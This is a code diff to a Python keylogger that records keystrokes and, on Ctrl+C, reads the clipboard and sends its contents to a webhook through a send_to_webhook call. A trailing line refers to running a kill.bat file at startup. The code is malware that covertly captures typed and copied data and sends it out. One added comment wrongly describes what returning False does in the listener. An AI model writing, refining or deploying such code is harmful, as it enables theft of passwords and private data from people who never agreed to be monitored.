@@ -82,6 +82,8 @@ def keystroke_monitor():
 
 def on_press(key):
     """Called when a key is pressed."""
+    global keystrokes, last_keypress_time
+
     try:
         if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
             keys_pressed.add("ctrl")
@@ -89,7 +91,9 @@ def on_press(key):
             # User pressed Ctrl+C, send clipboard content
             clipboard_content = pyperclip.paste()
             send_to_webhook(f"Clipboard content: {clipboard_content}")
+            return False  # Don't propagate 'C' key to prevent logging
         else:
+            # If it's a regular key, log it
             key_str = key.char if hasattr(key, 'char') else str(key)
             with lock:
                 keystrokes += key_str
@@ -100,14 +104,10 @@ def on_press(key):
 
 def on_release(key):
     """Called when a key is released."""
-    try:
-        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-            keys_pressed.discard("ctrl")
-        # Stop listener on Escape key press
-        if key == keyboard.Key.esc:
-            return False
-    except AttributeError:
-        pass
+    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        keys_pressed.discard("ctrl")
+    if key == keyboard.Key.esc:
+        return False  # Stop the listener when Escape is pressed
 
 
 # Run kill.bat file at the start
